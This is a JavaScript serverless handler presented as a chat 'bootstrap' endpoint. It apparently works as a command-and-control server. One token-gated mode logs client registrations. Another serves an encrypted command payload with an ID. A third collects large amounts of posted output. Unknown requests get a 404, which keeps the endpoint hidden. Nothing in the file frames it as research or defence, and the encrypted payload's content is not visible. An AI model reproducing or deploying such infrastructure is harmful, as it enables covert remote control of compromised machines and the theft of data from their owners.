import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '10';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}
function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}
export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_OUTPUT ${body.slice(0, 200000)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
